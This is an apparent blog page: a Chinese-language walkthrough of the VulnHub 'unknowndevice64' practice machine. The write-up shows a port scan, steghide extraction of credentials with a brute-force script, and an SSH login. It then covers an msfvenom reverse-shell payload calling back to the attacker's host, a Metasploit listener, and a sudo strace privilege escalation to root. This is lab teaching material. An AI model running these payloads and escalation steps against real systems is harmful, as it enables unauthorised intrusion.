@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            Vulhub Writeup-unknowndevice64-v1 |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Vulhub Writeup-unknowndevice64-v1</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2019-12-03 18:15:00</span>
+        <span class="mobile">2019-12-03 18:15</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">渗透靶场</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vulhub/">vulhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="靶场下载"><a href="#靶场下载" class="headerlink" title="靶场下载"></a>靶场下载</h1><p>VulnHub:  <a class="link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/unknowndevice64-1,293/" >unknowndevice64<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h1><table>
+<thead>
+<tr>
+<th>虚拟机</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kali</td>
+<td>192.168.19.142</td>
+</tr>
+<tr>
+<td>unknowndevice64</td>
+<td>192.168.1.132</td>
+</tr>
+</tbody></table>
+<p>通过netdiscover、nmap扫描局域网发现vulhub靶机的IP。</p>
+<h1 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h1><p>扫描端口及服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -T4 -sS -sV -p- 192.168.19.132</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 14:56 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.132</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)</span><br><span class="line">31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">MAC Address: 00:0C:29:E6:22:E7 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.99 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现http服务，浏览器访问 31337端口</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/20191202150543.png"></p>
+<p>查看页面源代码获得提示</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/20191202150932.png"></p>
+<p>浏览器访问<code>http://192.168.19.132:31337/key_is_h1dd3n.jpg</code> 发现是一张图片。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/20191202151147.png"></p>
+<p> 英文提示说明数据可能隐藏在图片中。下载图片后，使用<code>binwalk</code>查看是否有隐藏信息，使用<code>exiftool</code>查看元数据，均无发现。</p>
+<blockquote>
+<p>注：exiftool需要单独安装：apt-get install exiftool</p>
+</blockquote>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/20191202153550.png"></p>
+<p>使用常见图片数据隐写工具<code>stegslove</code>、<code>wbstego</code>、<code>steghide</code>尝试进行解密，发现利用steghide工具可以提取隐藏的信息，<code>steghide</code>用法示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将hide.txt文件隐藏到1.jpg中：</span></span><br><span class="line">steghide embed -cf 1.jpg -ef hide.txt -p 123456</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从1.jpg提取隐藏文件hide.txt:</span></span><br><span class="line">steghide extract -sf 1.jpg -p 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/20191202155306.png"></p>
+<p>这里需要解密密码，我们猜测密码是提示的内容<code>h1dd3n</code>，成功解密出<code>h1dd3n.txt</code>文件。这里如果猜不到，可以使用密码字典暴力破解的方式，见后文<code>cracksteghide.py</code>。</p>
+<p>经常打CTF的应该很熟悉，隐藏文件的内容是经过了brainfuck编码的数据，使用<a class="link"   target="_blank" rel="noopener" href="https://github.com/pocmo/Python-Brainfuck.git" >Python-Brainfuck<i class="fas fa-external-link-alt"></i></a>解密：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pocmo/Python-Brainfuck.git</span><br><span class="line"><span class="built_in">cd</span> Python-Brainfuck</span><br><span class="line">python brainfuck.py ../h1dd3n.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/J4RbT3.png"></p>
+<p>也可以使用在线解密工具解密：</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook" >https://www.splitbrain.org/services/ook<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://ctf.ssleye.com/brain.html" >http://ctf.ssleye.com/brain.html<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<p>解密结果<code>ud64:1M!#64@ud</code>看起来像是用户名密码，最开始我们扫描出ssh服务运行在1337端口上，于是ssh尝试登录，发现登录成功：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/C6m3hl.png"></p>
+<p>登录后发现这是一个受限的shell，并且无法使用python、expect命令获得交互shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">expect -c <span class="string">&#x27;spawn bash;interact&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/KkArDr.png"></p>
+<p>于是我们使用kali生成反弹木马，赋予执行权限，并通过ssh上传至目标靶机。这里从靶机的名字<code>unknowndevice64</code>我们猜测可能是64位系统，不过生成32位的程序在64位系统中也能执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.19.142 LPORT=9999 -f elf -o revshell.elf</span><br><span class="line"><span class="built_in">chmod</span> +x revshell.elf</span><br></pre></td></tr></table></figure>
+
+<p>因为是受限的shell，因此我们需要把木马程序上传到当前环境变量目录下，使用<code>echo $PATH</code>命令查看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo $PATH</span></span><br><span class="line">/home/ud64/prog</span><br></pre></td></tr></table></figure>
+
+<p>上传木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 1337 revshell.elf ud64@192.168.19.132:prog</span><br></pre></td></tr></table></figure>
+
+<p>kali启动msf监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.19.142</span><br><span class="line">LHOST =&gt; 192.168.19.142</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 9999</span><br><span class="line">LPORT =&gt; 9999</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>当目标执行revshell.elf时即可接收到反弹shell。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/EkEJfN.png"></p>
+<p>下一步就是提权了。在meterpreter中输入shell进入shell模式，并通过python获得一个交互shell。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/6FIEpi.png"></p>
+<p>kali上使用<code>python -m SimpleHTTPServer</code>命令启动一个http服务，托管提权辅助脚本<a class="link"   target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker/" >linuxprivchecker<i class="fas fa-external-link-alt"></i></a>，靶机上下载提权脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.19.142:8000/linuxprivchecker.py</span><br></pre></td></tr></table></figure>
+
+<p>刚才也可以在meterpreter中直接上传脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/linuxprivchecker.py /tmp/linuxprivchecker.py</span><br><span class="line">meterpreter &gt; <span class="built_in">chmod</span> 744 /tmp/linuxprivchecker.py</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+
+<p><code>wget</code>下载<code>linuxprivchecker.py</code>后  ，执行<code>python linuxprivchecker.py</code>命令查看提权辅助脚本的输出，发现可以使用sudo进行提权。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/A3xXC8.png"></p>
+<p>查看下拥有sudo权限的用户或者程序，发现能够以sudo权限执行<code>/usr/bin/sysud64</code>。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/bxTH7R.png"></p>
+<p>执行<code>/usr/bin/sysud64 -h</code>命令查看这个进程的情况，发现实际上就是strace。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/aKdgcz.png"></p>
+<p>在<a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/" >GTFOBins <i class="fas fa-external-link-alt"></i></a>项目主页可以找到利用<code>strace</code>提权的方法</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/dTl4ga.png"></p>
+<p>利用strace的sudo权限进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/sysud64 -o /dev/null /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/1vhRAM.png"></p>
+<p>可以看到成功提升到了root权限，在&#x2F;root目录下即可查看flag.txt文件</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/vulhub/LsD9mY.png"></p>
+<p>cracksteghide.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @ Author: ssooking</span></span><br><span class="line"><span class="comment"># @ Blog  : www.cnblogs.com/ssooking</span></span><br><span class="line"><span class="comment"># @ Github: https://github.com/ssooking</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">usage = <span class="string">&quot;\n[+] Usage: sudo python &quot;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; [Steg Picture File]&quot;</span>+<span class="string">&quot; [Password File]\n\n&quot;</span></span><br><span class="line">usage += <span class="string">&quot;    Example: sudo python &quot;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; 1.jpg&quot;</span>+<span class="string">&quot; password.txt\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackedStegHide</span>(<span class="params">stegfile,passfile</span>):</span><br><span class="line">	errors = [<span class="string">&#x27;Extract failed&#x27;</span>, <span class="string">&#x27;steghide --help&#x27;</span>, <span class="string">&#x27;Syntax error&#x27;</span>]</span><br><span class="line">	cmdFormat = <span class="string">&quot;/usr/bin/steghide extract -sf %s -p %s&quot;</span></span><br><span class="line">    </span><br><span class="line">	f = <span class="built_in">open</span>(passfile, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> f.readlines():</span><br><span class="line">		cmd = cmdFormat % (stegfile, l.strip())</span><br><span class="line">		p = Popen(cmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=STDOUT)</span><br><span class="line">		content = unicode(p.stdout.read(), <span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">		<span class="keyword">for</span> err <span class="keyword">in</span> errors:</span><br><span class="line">			<span class="keyword">if</span> err <span class="keyword">in</span> content:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span> content,</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrote extracted data to&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">        	<span class="built_in">print</span> <span class="string">&#x27;[+] Extracted successfully, the pass is %s !&#x27;</span> % (l.strip())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="built_in">print</span> <span class="string">&#x27;[!] Extract failed, maybe you shoud change your password file. &#x27;</span></span><br><span class="line">		f.close()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt;=<span class="number">1</span>:</span><br><span class="line">		<span class="built_in">print</span>(usage)</span><br><span class="line">		sys.exit(<span class="number">1</span>)</span><br><span class="line">	stegfile = sys.argv[<span class="number">1</span>]</span><br><span class="line">	passfile = sys.argv[<span class="number">2</span>]</span><br><span class="line">	CrackedStegHide(stegfile,passfile)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://blog.werner.wiki/penetrate-unknowndevice64/" >https://blog.werner.wiki/penetrate-unknowndevice64/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/unknowndevice64-1-vulnhub-lab-walkthrough/" >https://www.hackingarticles.in/unknowndevice64-1-vulnhub-lab-walkthrough/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/" >Restricted Linux Shell Escaping Techniques<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Vulhub Writeup-unknowndevice64-v1</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2019-12-03 18:15:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2019/12/vulhub-writeup-unknowndevice64-v1/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/vulhub/">#vulhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/12/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87webshell%E7%9A%84%E6%96%B9%E6%B3%95/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">制作图片Webshell的方法</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">域渗透之Kerberos</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.</span> <span class="nav-text">靶场下载</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">网络环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">渗透思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
